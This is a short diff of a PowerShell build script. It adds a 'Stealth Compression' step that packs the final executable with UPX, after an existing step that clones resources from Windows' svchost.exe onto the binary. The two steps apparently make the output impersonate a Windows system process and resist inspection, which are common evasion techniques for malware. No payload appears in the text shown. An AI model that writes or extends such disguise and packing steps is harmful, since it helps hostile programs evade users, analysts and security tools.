@@ -196,6 +196,11 @@ if ($LASTEXITCODE -eq 0) {
     $ClonerExe = "tools\publish\ResourceCloner.exe"
     & $ClonerExe "C:\Windows\System32\svchost.exe" $FinalExe
 }
+if (Get-Command upx.exe -ErrorAction SilentlyContinue) {
+    Write-Host "[*] Phase 7: UPX Packing (Stealth Compression)..." -ForegroundColor Cyan
+    & upx.exe --ultra-brute $FinalExe | Out-Null
+}
+
 Write-Host "`n[SUCCESS] Ultra-Optimized build complete!" -ForegroundColor Green
 Write-Host "[+] Binary: $FinalExe" -ForegroundColor White
 $Size = (Get-Item $FinalExe).Length / 1MB
